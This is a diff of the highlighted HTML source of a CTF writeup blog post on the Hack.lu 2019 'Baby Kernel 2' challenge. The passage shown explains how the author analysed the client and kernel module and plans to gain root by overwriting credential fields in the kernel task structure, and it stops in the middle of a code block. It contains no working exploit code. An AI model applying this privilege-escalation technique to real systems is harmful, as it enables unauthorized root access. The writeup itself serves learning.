@@ -1,119 +1,119 @@
 <!DOCTYPE html><html lang=en><head><title>Hack.lu 2019 - Baby Kernel 2 challenge writeup</title><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=description content="Writeup of the challenge " baby kernel 2&quot; from hack.lu 2019 capture the flag event. how to get root with a kernel read and write primitive?&quot;><meta name=author content="Antide Petit"><link rel=stylesheet type=text/css href=/static/css/style.css><link rel=stylesheet type=text/css href=/static/css/native.css></head><body><main><nav><ul><li><a href=/ >Index</a></li><li><a href=/b>Blog</a></li><li><a href=https://github.com/xarkes>Git</a></li><li><a href=https://twitter.com/xarkes_>Twitter</a></li></ul></nav><article><h1><a href=/b/hacklu-2019-babykernel-wu.html>Hack.lu 2019 - Baby Kernel 2 challenge writeup</a></h1><p class=meta>Published on 09 Dec 2019</p><p>Last october, I participated to <a href=https://2019.hack.lu/ >Hack.lu</a> Capture The Flag with my team <a href=https://securimag.org/ >Securimag</a>.</p><p>I did this writeup as all the ones I've read do not explain how they managed to reliably find the offset of <code>real_cred</code> in the <code>current_task</code> structure.</p><p>I didn't have much time to allocate for that challenge, and as I'm interested in exploitation, I quickly jumped on "Baby Kernel 2" as it was marked as easy and dealing with kernels.</p><h2>Overview</h2><p>The challenge provides a <a href=/files/baby_kernel_2.zip>ZIP archive</a> that contains multiple files:</p><ul><li><code>vmlinux</code> - A <a href=https://en.wikipedia.org/wiki/Vmlinux>linux kernel</a></li><li><code>System.map</code> - The symbols location for that kernel</li><li><code>initramfs.cpio.gz</code> - The initial root filesystem</li><li><code>bzImage</code> - Contains the bootloader and the stripped and compressed kernel</li><li><code>run.sh</code> - A script to run the kernel with qemu</li></ul><p>Note: In the archive I provide, I removed <code>vmlinux</code> as it is quite heavy and unecessary because <code>System.map</code> is given as well.</p><p>It is possible to extract the kernel from <code>bzImage</code> by using the <a href=https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux>extract-vmlinux</a> script from the linux kernel source code. Otherwise, <a href=https://github.com/ReFirmLabs/binwalk>binwalk</a> will manage to extract it as well:</p><div class=codehilite><pre><span></span><code><span class=c1># Extract with extract-vmlinux</span>
-./extract-vmlinux ./bzImage &gt; vmlinux
+./extract-vmlinux<span class=w> </span>./bzImage<span class=w> </span>&gt;<span class=w> </span>vmlinux
 <span class=c1># Extract with binwalk</span>
-binwalk -e ./bzImage
+binwalk<span class=w> </span>-e<span class=w> </span>./bzImage
 </code></pre></div><p>Let's run it to see what it looks like:</p><div class=codehilite><pre><span></span><code>.<span class=o>/</span><span class=nv>run</span>.<span class=nv>sh</span>
 
 ...
 
-<span class=o>-----</span> <span class=nv>Menu</span> <span class=o>-----</span>
-<span class=mi>1</span>. <span class=nv>Read</span>
-<span class=mi>2</span>. <span class=nv>Write</span>
-<span class=mi>3</span>. <span class=k>Show</span> <span class=nv>me</span> <span class=nv>my</span> <span class=nv>uid</span>
-<span class=mi>4</span>. <span class=nv>Read</span> <span class=nv>file</span>
-<span class=mi>5</span>. <span class=nv>Any</span> <span class=nv>hintz</span>?
-<span class=mi>6</span>. <span class=nv>Bye</span><span class=o>!</span>
+<span class=o>-----</span><span class=w> </span><span class=nv>Menu</span><span class=w> </span><span class=o>-----</span>
+<span class=mi>1</span>.<span class=w> </span><span class=nv>Read</span>
+<span class=mi>2</span>.<span class=w> </span><span class=nv>Write</span>
+<span class=mi>3</span>.<span class=w> </span><span class=k>Show</span><span class=w> </span><span class=nv>me</span><span class=w> </span><span class=nv>my</span><span class=w> </span><span class=nv>uid</span>
+<span class=mi>4</span>.<span class=w> </span><span class=nv>Read</span><span class=w> </span><span class=nv>file</span>
+<span class=mi>5</span>.<span class=w> </span><span class=nv>Any</span><span class=w> </span><span class=nv>hintz</span>?
+<span class=mi>6</span>.<span class=w> </span><span class=nv>Bye</span><span class=o>!</span>
 <span class=o>&gt;</span>
-</code></pre></div><p>Right after the linux VM booted, there's not shell to greet us, but only a small program that asks us do to an action.</p><h2>Understanding everything</h2><p>Since I was not doing the CTF to win, but rather just for fun, I decided to take the time to understand everything.</p><p>First of all, I decided to extract the default file system to see what was available on the system. To do so I used the following commands:</p><div class=codehilite><pre><span></span><code>$ mkdir root
-$ <span class=nb>cd</span> root
-$ cp ../initramfs.cpio.gz ./
-$ gunzip ./initramfs.cpio.gz
-$ cpio -id &lt; ./initramfs.cpio
-<span class=m>7393</span> blocks
-$ ls
-bin  client_kernel_baby_2  etc  flag  home  init  initramfs.cpio  lib  proc  root  sys  usr  var
+</code></pre></div><p>Right after the linux VM booted, there's not shell to greet us, but only a small program that asks us do to an action.</p><h2>Understanding everything</h2><p>Since I was not doing the CTF to win, but rather just for fun, I decided to take the time to understand everything.</p><p>First of all, I decided to extract the default file system to see what was available on the system. To do so I used the following commands:</p><div class=codehilite><pre><span></span><code>$<span class=w> </span>mkdir<span class=w> </span>root
+$<span class=w> </span><span class=nb>cd</span><span class=w> </span>root
+$<span class=w> </span>cp<span class=w> </span>../initramfs.cpio.gz<span class=w> </span>./
+$<span class=w> </span>gunzip<span class=w> </span>./initramfs.cpio.gz
+$<span class=w> </span>cpio<span class=w> </span>-id<span class=w> </span>&lt;<span class=w> </span>./initramfs.cpio
+<span class=m>7393</span><span class=w> </span>blocks
+$<span class=w> </span>ls
+bin<span class=w>  </span>client_kernel_baby_2<span class=w>  </span>etc<span class=w>  </span>flag<span class=w>  </span>home<span class=w>  </span>init<span class=w>  </span>initramfs.cpio<span class=w>  </span>lib<span class=w>  </span>proc<span class=w>  </span>root<span class=w>  </span>sys<span class=w>  </span>usr<span class=w>  </span>var
 $
-</code></pre></div><p>Now to understand what was this program that was ran during startup, I read the <code>init</code> file. There are many lines, but more importantly:</p><div class=codehilite><pre><span></span><code>chmod <span class=m>700</span> /flag
-mkdir -p /lib/modules/<span class=k>$(</span>uname -r<span class=k>)</span>
-insmod <span class=s2>&quot;/lib/modules/</span><span class=k>$(</span>uname -r<span class=k>)</span><span class=s2>/kernel_baby_2.ko&quot;</span>
-chmod +rw /dev/flux_baby_2
-chmod +x /client_kernel_baby_2
-sleep <span class=m>2</span>
-su user -c /client_kernel_baby_2
-</code></pre></div><ol><li>During <a href=https://en.wikipedia.org/wiki/Linux_startup_process#Init_process>init</a> the file <code>/flag</code> is set to read, write and execute permissions for user <code>root</code> only.</li><li>A kernel module is loaded</li><li>The file <code>/client_kernel_baby_2</code> is set as executable, and is started with the user named <code>user</code>.</li></ol><h3>The client</h3><p>Quickly, I decided to check what the client file does. In fact, I was intrigued as the challenge was supposed to be an easy kernel exploitation, but here only a userland application was available.</p><p>The binary is not stripped, and we can quickly understand what is happening. Using <a href=https://github.com/radareorg/radare2>radare2</a>, I quickly disassembled the program to understand what it does. As we've seen above, there are 6 actions available and 3 to 6 do what they mean to do.</p><ul><li>The command <code>3</code> will call <code>system("id");</code></li><li>The command <code>4</code> will read try to open <code>/flag</code> and read its content.</li><li>The command <code>5</code> will print a hint.</li><li>The command <code>6</code> will exit the program, that will cause the system to halt.</li></ul><p>So nothing suprising from here, but what do <code>1</code> and <code>2</code> do exactly? There are two unstripped functions in the binary that are named <code>do_read</code> and <code>do_write</code>. And what do they do? They trigger an <a href=http://man7.org/linux/man-pages/man2/ioctl.2.html>ioctl</a> (request 901 for the read function, request 902 for the write function) with the given parameters that are read from the user input.</p><p>Alright, so I think it's time to disassemble the kernel module.</p><h3>The kernel module</h3><p>The kernel module is rather small, and not stripped. We can spot the function <code>driver_ioctl</code> and inspect it. It will compare the first argument with 901 and 902 and if it matches any it will either call the function <code>read</code> or <code>_copy_from_user</code> respectively with the arguments from the user.</p><p>The function <code>read</code> will use <a href=https://www.fsl.cs.sunysb.edu/kernel-api/re256.html>copy_to_user</a> to read data from the kernel to userland, and <a href=https://www.fsl.cs.sunysb.edu/kernel-api/re257.html>copy_from_user</a> is used to copy data from userland (our input program) into the kernel.</p><p>So now it's becoming clearer that we can interact with kernel land through the provided program.</p><h2>Exploitation</h2><p>So, the goal of the challenge is to read the <code>/flag</code> file, but as we've seen earlier, it is readable for user <code>root</code> only. How can we do that? Well I think there are multiple ways of doing it, but here is the way I chose. Since it's not necessary to pop a shell or anything too complicated, the only goal of the challenge is to elevate the privileges of the current process to <code>root</code>.</p><p>Usually it is possible to do so by calling <code>commit_creds(prepare_kernel_cred(0));</code>. In our context all we can do is read and write some kernel space memory. So let's see what the <a href=https://elixir.bootlin.com/linux/v4.19.77/source/kernel/cred.c#L427>commit_creds</a> function do.</p><div class=codehilite><pre><span></span><code><span class=kt>int</span> <span class=nf>commit_creds</span><span class=p>(</span><span class=k>struct</span> <span class=nc>cred</span> <span class=o>*</span><span class=n>new</span><span class=p>)</span>
+</code></pre></div><p>Now to understand what was this program that was ran during startup, I read the <code>init</code> file. There are many lines, but more importantly:</p><div class=codehilite><pre><span></span><code>chmod<span class=w> </span><span class=m>700</span><span class=w> </span>/flag
+mkdir<span class=w> </span>-p<span class=w> </span>/lib/modules/<span class=k>$(</span>uname<span class=w> </span>-r<span class=k>)</span>
+insmod<span class=w> </span><span class=s2>&quot;/lib/modules/</span><span class=k>$(</span>uname<span class=w> </span>-r<span class=k>)</span><span class=s2>/kernel_baby_2.ko&quot;</span>
+chmod<span class=w> </span>+rw<span class=w> </span>/dev/flux_baby_2
+chmod<span class=w> </span>+x<span class=w> </span>/client_kernel_baby_2
+sleep<span class=w> </span><span class=m>2</span>
+su<span class=w> </span>user<span class=w> </span>-c<span class=w> </span>/client_kernel_baby_2
+</code></pre></div><ol><li>During <a href=https://en.wikipedia.org/wiki/Linux_startup_process#Init_process>init</a> the file <code>/flag</code> is set to read, write and execute permissions for user <code>root</code> only.</li><li>A kernel module is loaded</li><li>The file <code>/client_kernel_baby_2</code> is set as executable, and is started with the user named <code>user</code>.</li></ol><h3>The client</h3><p>Quickly, I decided to check what the client file does. In fact, I was intrigued as the challenge was supposed to be an easy kernel exploitation, but here only a userland application was available.</p><p>The binary is not stripped, and we can quickly understand what is happening. Using <a href=https://github.com/radareorg/radare2>radare2</a>, I quickly disassembled the program to understand what it does. As we've seen above, there are 6 actions available and 3 to 6 do what they mean to do.</p><ul><li>The command <code>3</code> will call <code>system("id");</code></li><li>The command <code>4</code> will read try to open <code>/flag</code> and read its content.</li><li>The command <code>5</code> will print a hint.</li><li>The command <code>6</code> will exit the program, that will cause the system to halt.</li></ul><p>So nothing suprising from here, but what do <code>1</code> and <code>2</code> do exactly? There are two unstripped functions in the binary that are named <code>do_read</code> and <code>do_write</code>. And what do they do? They trigger an <a href=http://man7.org/linux/man-pages/man2/ioctl.2.html>ioctl</a> (request 901 for the read function, request 902 for the write function) with the given parameters that are read from the user input.</p><p>Alright, so I think it's time to disassemble the kernel module.</p><h3>The kernel module</h3><p>The kernel module is rather small, and not stripped. We can spot the function <code>driver_ioctl</code> and inspect it. It will compare the first argument with 901 and 902 and if it matches any it will either call the function <code>read</code> or <code>_copy_from_user</code> respectively with the arguments from the user.</p><p>The function <code>read</code> will use <a href=https://www.fsl.cs.sunysb.edu/kernel-api/re256.html>copy_to_user</a> to read data from the kernel to userland, and <a href=https://www.fsl.cs.sunysb.edu/kernel-api/re257.html>copy_from_user</a> is used to copy data from userland (our input program) into the kernel.</p><p>So now it's becoming clearer that we can interact with kernel land through the provided program.</p><h2>Exploitation</h2><p>So, the goal of the challenge is to read the <code>/flag</code> file, but as we've seen earlier, it is readable for user <code>root</code> only. How can we do that? Well I think there are multiple ways of doing it, but here is the way I chose. Since it's not necessary to pop a shell or anything too complicated, the only goal of the challenge is to elevate the privileges of the current process to <code>root</code>.</p><p>Usually it is possible to do so by calling <code>commit_creds(prepare_kernel_cred(0));</code>. In our context all we can do is read and write some kernel space memory. So let's see what the <a href=https://elixir.bootlin.com/linux/v4.19.77/source/kernel/cred.c#L427>commit_creds</a> function do.</p><div class=codehilite><pre><span></span><code><span class=kt>int</span><span class=w> </span><span class=nf>commit_creds</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>cred</span><span class=w> </span><span class=o>*</span><span class=n>new</span><span class=p>)</span>
 <span class=p>{</span>
-    <span class=k>struct</span> <span class=nc>task_struct</span> <span class=o>*</span><span class=n>task</span> <span class=o>=</span> <span class=n>current</span><span class=p>;</span>
-    <span class=k>const</span> <span class=k>struct</span> <span class=nc>cred</span> <span class=o>*</span><span class=n>old</span> <span class=o>=</span> <span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>;</span>
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>task_struct</span><span class=w> </span><span class=o>*</span><span class=n>task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>current</span><span class=p>;</span>
+<span class=w>    </span><span class=k>const</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>cred</span><span class=w> </span><span class=o>*</span><span class=n>old</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>;</span>
 
-    <span class=cm>/* ... */</span>
+<span class=w>    </span><span class=cm>/* ... */</span>
 
-    <span class=n>rcu_assign_pointer</span><span class=p>(</span><span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>,</span> <span class=n>new</span><span class=p>);</span>
-    <span class=n>rcu_assign_pointer</span><span class=p>(</span><span class=n>task</span><span class=o>-&gt;</span><span class=n>cred</span><span class=p>,</span> <span class=n>new</span><span class=p>);</span>
+<span class=w>    </span><span class=n>rcu_assign_pointer</span><span class=p>(</span><span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>,</span><span class=w> </span><span class=n>new</span><span class=p>);</span>
+<span class=w>    </span><span class=n>rcu_assign_pointer</span><span class=p>(</span><span class=n>task</span><span class=o>-&gt;</span><span class=n>cred</span><span class=p>,</span><span class=w> </span><span class=n>new</span><span class=p>);</span>
 
-    <span class=cm>/* ... */</span>
+<span class=w>    </span><span class=cm>/* ... */</span>
 
-    <span class=cm>/* release the old obj and subj refs both */</span>
-    <span class=n>put_cred</span><span class=p>(</span><span class=n>old</span><span class=p>);</span>
-    <span class=n>put_cred</span><span class=p>(</span><span class=n>old</span><span class=p>);</span>
-    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=w>    </span><span class=cm>/* release the old obj and subj refs both */</span>
+<span class=w>    </span><span class=n>put_cred</span><span class=p>(</span><span class=n>old</span><span class=p>);</span>
+<span class=w>    </span><span class=n>put_cred</span><span class=p>(</span><span class=n>old</span><span class=p>);</span>
+<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
 <span class=p>}</span>
-</code></pre></div><p>The linux kernel provides a macro <a href=https://elixir.bootlin.com/linux/v4.19.77/source/arch/x86/include/asm/current.h#L18>current</a> also known as <code>struct task_struct *current_task</code> that is a pointer to the currently executed process.</p><p>Here the function <code>commit_creds</code> just updates the <code>current-&gt;real_cred</code> and <code>current-&gt;cred</code> pointers to the new credentials.</p><p>The <a href="">task_struct</a> structure is quite big, but has indeed the <code>real_cred</code> and <code>cred</code> members:</p><div class=codehilite><pre><span></span><code><span class=k>struct</span> <span class=nc>task_struct</span> <span class=p>{</span>
-    <span class=cm>/* ... */</span>
+</code></pre></div><p>The linux kernel provides a macro <a href=https://elixir.bootlin.com/linux/v4.19.77/source/arch/x86/include/asm/current.h#L18>current</a> also known as <code>struct task_struct *current_task</code> that is a pointer to the currently executed process.</p><p>Here the function <code>commit_creds</code> just updates the <code>current-&gt;real_cred</code> and <code>current-&gt;cred</code> pointers to the new credentials.</p><p>The <a href="">task_struct</a> structure is quite big, but has indeed the <code>real_cred</code> and <code>cred</code> members:</p><div class=codehilite><pre><span></span><code><span class=k>struct</span><span class=w> </span><span class=nc>task_struct</span><span class=w> </span><span class=p>{</span>
+<span class=w>    </span><span class=cm>/* ... */</span>
 
-    <span class=cm>/* Process credentials: */</span>
-    <span class=cm>/* Tracer&#39;s credentials at attach: */</span>
-    <span class=k>const</span> <span class=k>struct</span> <span class=nc>cred</span> <span class=n>__rcu</span>     <span class=o>*</span><span class=n>ptracer_cred</span><span class=p>;</span>
-    <span class=cm>/* Objective and real subjective task credentials (COW): */</span>
-    <span class=k>const</span> <span class=k>struct</span> <span class=nc>cred</span> <span class=n>__rcu</span>     <span class=o>*</span><span class=n>real_cred</span><span class=p>;</span>
-    <span class=cm>/* Effective (overridable) subjective task credentials (COW): */</span>
-    <span class=k>const</span> <span class=k>struct</span> <span class=nc>cred</span> <span class=n>__rcu</span>     <span class=o>*</span><span class=n>cred</span><span class=p>;</span>
+<span class=w>    </span><span class=cm>/* Process credentials: */</span>
+<span class=w>    </span><span class=cm>/* Tracer&#39;s credentials at attach: */</span>
+<span class=w>    </span><span class=k>const</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>cred</span><span class=w> </span><span class=n>__rcu</span><span class=w>     </span><span class=o>*</span><span class=n>ptracer_cred</span><span class=p>;</span>
+<span class=w>    </span><span class=cm>/* Objective and real subjective task credentials (COW): */</span>
+<span class=w>    </span><span class=k>const</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>cred</span><span class=w> </span><span class=n>__rcu</span><span class=w>     </span><span class=o>*</span><span class=n>real_cred</span><span class=p>;</span>
+<span class=w>    </span><span class=cm>/* Effective (overridable) subjective task credentials (COW): */</span>
+<span class=w>    </span><span class=k>const</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>cred</span><span class=w> </span><span class=n>__rcu</span><span class=w>     </span><span class=o>*</span><span class=n>cred</span><span class=p>;</span>
 
-    <span class=cm>/* ... */</span>
+<span class=w>    </span><span class=cm>/* ... */</span>
 <span class=p>};</span>
-</code></pre></div><p>The <a href=https://elixir.bootlin.com/linux/v4.19.77/source/include/linux/cred.h#L116>cred</a> structure looks as follows:</p><div class=codehilite><pre><span></span><code><span class=k>struct</span> <span class=nc>cred</span> <span class=p>{</span>
-    <span class=n>atomic_t</span>    <span class=n>usage</span><span class=p>;</span>
+</code></pre></div><p>The <a href=https://elixir.bootlin.com/linux/v4.19.77/source/include/linux/cred.h#L116>cred</a> structure looks as follows:</p><div class=codehilite><pre><span></span><code><span class=k>struct</span><span class=w> </span><span class=nc>cred</span><span class=w> </span><span class=p>{</span>
+<span class=w>    </span><span class=n>atomic_t</span><span class=w>    </span><span class=n>usage</span><span class=p>;</span>
 <span class=cp>#ifdef CONFIG_DEBUG_CREDENTIALS</span>
-    <span class=n>atomic_t</span>    <span class=n>subscribers</span><span class=p>;</span>    <span class=cm>/* number of processes subscribed */</span>
-    <span class=kt>void</span>        <span class=o>*</span><span class=n>put_addr</span><span class=p>;</span>
-    <span class=kt>unsigned</span>    <span class=n>magic</span><span class=p>;</span>
+<span class=w>    </span><span class=n>atomic_t</span><span class=w>    </span><span class=n>subscribers</span><span class=p>;</span><span class=w>    </span><span class=cm>/* number of processes subscribed */</span>
+<span class=w>    </span><span class=kt>void</span><span class=w>        </span><span class=o>*</span><span class=n>put_addr</span><span class=p>;</span>
+<span class=w>    </span><span class=kt>unsigned</span><span class=w>    </span><span class=n>magic</span><span class=p>;</span>
 <span class=cp>#define CRED_MAGIC  0x43736564</span>
 <span class=cp>#define CRED_MAGIC_DEAD 0x44656144</span>
 <span class=cp>#endif</span>
-    <span class=n>kuid_t</span>      <span class=n>uid</span><span class=p>;</span>        <span class=cm>/* real UID of the task */</span>
-    <span class=n>kgid_t</span>      <span class=n>gid</span><span class=p>;</span>        <span class=cm>/* real GID of the task */</span>
-    <span class=n>kuid_t</span>      <span class=n>suid</span><span class=p>;</span>       <span class=cm>/* saved UID of the task */</span>
-    <span class=n>kgid_t</span>      <span class=n>sgid</span><span class=p>;</span>       <span class=cm>/* saved GID of the task */</span>
-    <span class=n>kuid_t</span>      <span class=n>euid</span><span class=p>;</span>       <span class=cm>/* effective UID of the task */</span>
-    <span class=n>kgid_t</span>      <span class=n>egid</span><span class=p>;</span>       <span class=cm>/* effective GID of the task */</span>
-    <span class=n>kuid_t</span>      <span class=n>fsuid</span><span class=p>;</span>      <span class=cm>/* UID for VFS ops */</span>
-    <span class=n>kgid_t</span>      <span class=n>fsgid</span><span class=p>;</span>      <span class=cm>/* GID for VFS ops */</span>
-    <span class=kt>unsigned</span>    <span class=n>securebits</span><span class=p>;</span> <span class=cm>/* SUID-less security management */</span>
-    <span class=n>kernel_cap_t</span>    <span class=n>cap_inheritable</span><span class=p>;</span> <span class=cm>/* caps our children can inherit */</span>
-    <span class=n>kernel_cap_t</span>    <span class=n>cap_permitted</span><span class=p>;</span>  <span class=cm>/* caps we&#39;re permitted */</span>
-    <span class=n>kernel_cap_t</span>    <span class=n>cap_effective</span><span class=p>;</span>  <span class=cm>/* caps we can actually use */</span>
-    <span class=n>kernel_cap_t</span>    <span class=n>cap_bset</span><span class=p>;</span>   <span class=cm>/* capability bounding set */</span>
-    <span class=n>kernel_cap_t</span>    <span class=n>cap_ambient</span><span class=p>;</span>    <span class=cm>/* Ambient capability set */</span>
+<span class=w>    </span><span class=n>kuid_t</span><span class=w>      </span><span class=n>uid</span><span class=p>;</span><span class=w>        </span><span class=cm>/* real UID of the task */</span>
+<span class=w>    </span><span class=n>kgid_t</span><span class=w>      </span><span class=n>gid</span><span class=p>;</span><span class=w>        </span><span class=cm>/* real GID of the task */</span>
+<span class=w>    </span><span class=n>kuid_t</span><span class=w>      </span><span class=n>suid</span><span class=p>;</span><span class=w>       </span><span class=cm>/* saved UID of the task */</span>
+<span class=w>    </span><span class=n>kgid_t</span><span class=w>      </span><span class=n>sgid</span><span class=p>;</span><span class=w>       </span><span class=cm>/* saved GID of the task */</span>
+<span class=w>    </span><span class=n>kuid_t</span><span class=w>      </span><span class=n>euid</span><span class=p>;</span><span class=w>       </span><span class=cm>/* effective UID of the task */</span>
+<span class=w>    </span><span class=n>kgid_t</span><span class=w>      </span><span class=n>egid</span><span class=p>;</span><span class=w>       </span><span class=cm>/* effective GID of the task */</span>
+<span class=w>    </span><span class=n>kuid_t</span><span class=w>      </span><span class=n>fsuid</span><span class=p>;</span><span class=w>      </span><span class=cm>/* UID for VFS ops */</span>
+<span class=w>    </span><span class=n>kgid_t</span><span class=w>      </span><span class=n>fsgid</span><span class=p>;</span><span class=w>      </span><span class=cm>/* GID for VFS ops */</span>
+<span class=w>    </span><span class=kt>unsigned</span><span class=w>    </span><span class=n>securebits</span><span class=p>;</span><span class=w> </span><span class=cm>/* SUID-less security management */</span>
+<span class=w>    </span><span class=n>kernel_cap_t</span><span class=w>    </span><span class=n>cap_inheritable</span><span class=p>;</span><span class=w> </span><span class=cm>/* caps our children can inherit */</span>
+<span class=w>    </span><span class=n>kernel_cap_t</span><span class=w>    </span><span class=n>cap_permitted</span><span class=p>;</span><span class=w>  </span><span class=cm>/* caps we&#39;re permitted */</span>
+<span class=w>    </span><span class=n>kernel_cap_t</span><span class=w>    </span><span class=n>cap_effective</span><span class=p>;</span><span class=w>  </span><span class=cm>/* caps we can actually use */</span>
+<span class=w>    </span><span class=n>kernel_cap_t</span><span class=w>    </span><span class=n>cap_bset</span><span class=p>;</span><span class=w>   </span><span class=cm>/* capability bounding set */</span>
+<span class=w>    </span><span class=n>kernel_cap_t</span><span class=w>    </span><span class=n>cap_ambient</span><span class=p>;</span><span class=w>    </span><span class=cm>/* Ambient capability set */</span>
 <span class=cp>#ifdef CONFIG_KEYS</span>
-    <span class=kt>unsigned</span> <span class=kt>char</span>   <span class=n>jit_keyring</span><span class=p>;</span>    <span class=cm>/* default keyring to attach requested</span>
+<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>char</span><span class=w>   </span><span class=n>jit_keyring</span><span class=p>;</span><span class=w>    </span><span class=cm>/* default keyring to attach requested</span>
 <span class=cm>                     * keys to */</span>
-    <span class=k>struct</span> <span class=nc>key</span> <span class=n>__rcu</span> <span class=o>*</span><span class=n>session_keyring</span><span class=p>;</span> <span class=cm>/* keyring inherited over fork */</span>
-    <span class=k>struct</span> <span class=nc>key</span>  <span class=o>*</span><span class=n>process_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this process */</span>
-    <span class=k>struct</span> <span class=nc>key</span>  <span class=o>*</span><span class=n>thread_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this thread */</span>
-    <span class=k>struct</span> <span class=nc>key</span>  <span class=o>*</span><span class=n>request_key_auth</span><span class=p>;</span> <span class=cm>/* assumed request_key authority */</span>
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>key</span><span class=w> </span><span class=n>__rcu</span><span class=w> </span><span class=o>*</span><span class=n>session_keyring</span><span class=p>;</span><span class=w> </span><span class=cm>/* keyring inherited over fork */</span>
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>key</span><span class=w>  </span><span class=o>*</span><span class=n>process_keyring</span><span class=p>;</span><span class=w> </span><span class=cm>/* keyring private to this process */</span>
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>key</span><span class=w>  </span><span class=o>*</span><span class=n>thread_keyring</span><span class=p>;</span><span class=w> </span><span class=cm>/* keyring private to this thread */</span>
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>key</span><span class=w>  </span><span class=o>*</span><span class=n>request_key_auth</span><span class=p>;</span><span class=w> </span><span class=cm>/* assumed request_key authority */</span>
 <span class=cp>#endif</span>
 <span class=cp>#ifdef CONFIG_SECURITY</span>
-    <span class=kt>void</span>        <span class=o>*</span><span class=n>security</span><span class=p>;</span>  <span class=cm>/* subjective LSM security */</span>
+<span class=w>    </span><span class=kt>void</span><span class=w>        </span><span class=o>*</span><span class=n>security</span><span class=p>;</span><span class=w>  </span><span class=cm>/* subjective LSM security */</span>
 <span class=cp>#endif</span>
-    <span class=k>struct</span> <span class=nc>user_struct</span> <span class=o>*</span><span class=n>user</span><span class=p>;</span>   <span class=cm>/* real user ID subscription */</span>
-    <span class=k>struct</span> <span class=nc>user_namespace</span> <span class=o>*</span><span class=n>user_ns</span><span class=p>;</span> <span class=cm>/* user_ns the caps and keyrings are relative to. */</span>
-    <span class=k>struct</span> <span class=nc>group_info</span> <span class=o>*</span><span class=n>group_info</span><span class=p>;</span>  <span class=cm>/* supplementary groups for euid/fsgid */</span>
-    <span class=cm>/* RCU deletion */</span>
-    <span class=k>union</span> <span class=p>{</span>
-        <span class=kt>int</span> <span class=n>non_rcu</span><span class=p>;</span>            <span class=cm>/* Can we skip RCU deletion? */</span>
-        <span class=k>struct</span> <span class=nc>rcu_head</span> <span class=n>rcu</span><span class=p>;</span>        <span class=cm>/* RCU deletion hook */</span>
-    <span class=p>};</span>
-<span class=p>}</span> <span class=n>__randomize_layout</span><span class=p>;</span>
-</code></pre></div><p>In the end, what we can do is just to overwrite most of the <code>real_cred</code> structure members to update the user id and group id to 0 (root) until we can manage to read the flag. In fact, it is only necessary to update the <code>fsuid</code> field as it is the one that will be checked when accessing a file on the filesystem.</p><p>Once we understood all of this, we have to find where those fields are located in the memory. Luckily, we were provided the <code>System.map</code> file that contains all the symbols we need. In the original archive, <code>vmlinux</code> was also provided and already contained all those symbols. The first action that is done in the <code>commit_creds</code> function is to dereference the <code>current_task</code> and access the <code>real_cred</code> member.</p><div class=codehilite><pre><span></span><code><span class=kt>int</span> <span class=nf>commit_creds</span><span class=p>(</span><span class=k>struct</span> <span class=nc>cred</span> <span class=o>*</span><span class=n>new</span><span class=p>)</span>
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>user_struct</span><span class=w> </span><span class=o>*</span><span class=n>user</span><span class=p>;</span><span class=w>   </span><span class=cm>/* real user ID subscription */</span>
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>user_namespace</span><span class=w> </span><span class=o>*</span><span class=n>user_ns</span><span class=p>;</span><span class=w> </span><span class=cm>/* user_ns the caps and keyrings are relative to. */</span>
+<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>group_info</span><span class=w> </span><span class=o>*</span><span class=n>group_info</span><span class=p>;</span><span class=w>  </span><span class=cm>/* supplementary groups for euid/fsgid */</span>
+<span class=w>    </span><span class=cm>/* RCU deletion */</span>
+<span class=w>    </span><span class=k>union</span><span class=w> </span><span class=p>{</span>
+<span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>non_rcu</span><span class=p>;</span><span class=w>            </span><span class=cm>/* Can we skip RCU deletion? */</span>
+<span class=w>        </span><span class=k>struct</span><span class=w> </span><span class=nc>rcu_head</span><span class=w> </span><span class=n>rcu</span><span class=p>;</span><span class=w>        </span><span class=cm>/* RCU deletion hook */</span>
+<span class=w>    </span><span class=p>};</span>
+<span class=p>}</span><span class=w> </span><span class=n>__randomize_layout</span><span class=p>;</span>
+</code></pre></div><p>In the end, what we can do is just to overwrite most of the <code>real_cred</code> structure members to update the user id and group id to 0 (root) until we can manage to read the flag. In fact, it is only necessary to update the <code>fsuid</code> field as it is the one that will be checked when accessing a file on the filesystem.</p><p>Once we understood all of this, we have to find where those fields are located in the memory. Luckily, we were provided the <code>System.map</code> file that contains all the symbols we need. In the original archive, <code>vmlinux</code> was also provided and already contained all those symbols. The first action that is done in the <code>commit_creds</code> function is to dereference the <code>current_task</code> and access the <code>real_cred</code> member.</p><div class=codehilite><pre><span></span><code><span class=kt>int</span><span class=w> </span><span class=nf>commit_creds</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>cred</span><span class=w> </span><span class=o>*</span><span class=n>new</span><span class=p>)</span>
 <span class=p>{</span>
-    <span class=k>struct</span> <span class=nc>task_struct</span> <span class=o>*</span><span class=n>task</span> <span class=o>=</span> <span class=n>current</span><span class=p>;</span>
